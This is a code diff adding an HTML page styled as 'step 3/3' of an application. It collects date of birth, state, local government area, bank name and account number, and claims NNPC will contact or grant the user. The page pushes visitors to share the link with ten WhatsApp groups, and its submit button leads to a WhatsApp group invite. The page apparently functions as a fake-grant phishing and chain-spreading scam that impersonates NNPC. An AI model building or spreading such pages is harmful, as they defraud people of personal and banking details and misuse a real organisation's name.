@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2/2 of form submission</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="remain">
+    <p align="left">
+      <b>This is step 3/3. Please make sure you don't skip any step and check well to avoid errors.</b>
+    </p>
+  </div>
+ 
+  <form align="center" action="https://api.whatsapp.com/send" method="GET" target="_blank">
+    <fieldset>
+      <legend><b>Finish the last step</b></legend>
+      <hr> 
+      <label for="Db"><b>Date of birth</b></label><br>
+      <input type="date" name="text" required="required" id="Db"><br><br>
+     
+      <label for="sname"><b>State name</b></label><br>
+      <input type="text" name="text" id="sname" placeholder="Enter your state name here" required="required"><br><br>
+     
+      <label for="LGA"><b>LGA name</b></label><br>
+      <input type="text" id="LGA" name="text" placeholder="Enter your local government" required="required"><br><br>
+      
+      <label for="BNAME"><b>Bank name</b></label><br><br>
+      <select name="text" id="BNAME" required="required">
+        <option value="First Bank of Nigeria">First Bank of Nigeria</option>
+        <option value="Zenith bank">Zenith bank</option>
+        <!-- Add other bank options here -->
+      </select><br><br>
+    
+      <label for="acn"><b>Account Number</b></label><br>
+      <input type="text" id="acn" name="text" placeholder="Enter your account number" required="required"><br><br>
+    
+      <fieldset>
+        <legend><b>Select gender</b></legend>
+        <label for="female">Female</label>
+        <input type="radio" id="female" name="text" required="required">
+        <label for="male">Male</label>
+        <input type="radio" id="male" name="text" required="required">
+      </fieldset>
+      
+      <hr><br>
+    </fieldset>
+    <p align="justify">
+      <b>Now the last step remains for you to click and share this link with 10 groups for your friends and other members to benefit.</b>
+      <br><br>
+      After sharing the link, click the submit button so that NNPC will receive your details to contact or grant you as soon as possible.
+    </p>
+    <input type="range" min="0" max="100" step="10" name="range" id="range">
+    <p align="center">
+      <a id="shareButton" href="https://api.whatsapp.com/send?text=hello" target="_blank">
+        <img src="share.png" width="250px" alt="Share">
+      </a>
+      <a id="submitButton" href="https://chat.whatsapp.com/Dfn3kjkJOjL0M4EAxO6X6p">
+        <img src="submit.png" width="250px" alt="Submit">
+      </a>
+    </p>
+  </form>
+  <script src="script.js"></script>
+</body>
+</html>
